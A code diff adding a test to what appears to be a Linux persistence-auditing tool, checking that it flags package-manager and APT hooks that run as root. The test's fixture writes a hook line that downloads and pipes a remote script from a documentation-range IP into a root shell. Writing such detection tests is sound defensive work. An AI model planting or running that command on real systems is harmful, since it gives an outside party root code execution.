@@ -111,5 +111,19 @@ def test_dns_rows():
     assert t('+DNSOverTLS', 'stub', '-DNSOverTLS') == ['DNS over TLS'] and list(dns_rows('')) == []
 
 
+def test_package_hooks():
+    import arche.persistence as p
+    d = tempfile.mkdtemp(); atexit.register(shutil.rmtree, d, True)
+    open(f'{d}/x.actions', 'w').write('# note\npost_transaction:::enabled=1:/usr/bin/sh -c "curl -s http://198.51.100.7/i | sh"\n')
+    open(f'{d}/99x', 'w').write('APT::Update::Pre-Invoke {"/opt/u/run";};\nAPT::Periodic::Enable "1";\n')
+    open(f'{d}/own.actions', 'w').write('pre_transaction::::/usr/libexec/guard\n')
+    real = p.PM_HOOKS, p.owned, p.have
+    p.PM_HOOKS, p.owned, p.have = (f'{d}/*.actions', f'{d}/99x'), lambda fs: {f for f in fs if 'own.' in f}, lambda c: False
+    try: rows = [(t.replace(d, '~'), s) for t, s, _ in p.hooks() if d in t]
+    finally: p.PM_HOOKS, p.owned, p.have = real
+    assert rows[0] == ('Runs as root at every package install or update: ~/99x: APT::Update::Pre-Invoke {"/opt/u/run";};', 0), rows
+    assert rows[1][0].startswith('Runs as root at every package install or update: ~/x.actions: post_transaction') and rows[2][1] == 1 and len(rows) == 3, rows
+
+
 if __name__ == '__main__':
-    test_hooks(); test_dns_rows(); test_git_runs(); test_repo_git_folder(); test_custom_chromium_dirs(); test_unpacked_extensions(); test_dropins(); test_root_groups(); test_install_cmds(); print('ok')
+    test_package_hooks(); test_hooks(); test_dns_rows(); test_git_runs(); test_repo_git_folder(); test_custom_chromium_dirs(); test_unpacked_extensions(); test_dropins(); test_root_groups(); test_install_cmds(); print('ok')
